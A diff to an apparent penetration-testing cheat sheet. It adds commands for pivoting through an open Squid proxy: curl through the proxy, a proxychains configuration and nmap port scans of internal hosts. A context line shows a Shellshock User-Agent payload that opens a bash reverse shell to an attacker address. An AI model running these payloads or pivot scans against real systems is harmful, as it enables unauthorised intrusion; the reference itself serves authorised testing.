@@ -51,6 +51,36 @@ curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; bash -i >& /dev/tcp/<at
 restricted: cannot specify `/' in command names
 ```
 
+Squid
+
+```shell
+# Usually use port 3128
+curl --proxy http://<Squid host ip>:<port> http://<target ip>:<port>
+```
+
+using proxychains
+
+```shell
+# edit
+sudo vim /etc/proxychains4.conf
+
+#socks4  127.0.0.1 9050
+#socks5  127.0.0.1 1080
+
+http <Squid host ip> <port>
+```
+
+```shell
+proxychains nmap -p- -Pn -sT localhost
+proxychains nmap -p- -Pn -sT <target ip>
+```
+
+using [spose](https://github.com/aancw/spose) to scan open port
+
+```
+python spose.py --proxy http://<Squid host ip>:<port> --target <target ip>
+```
+
 #### Chrome
 
 --remote-debugging-port
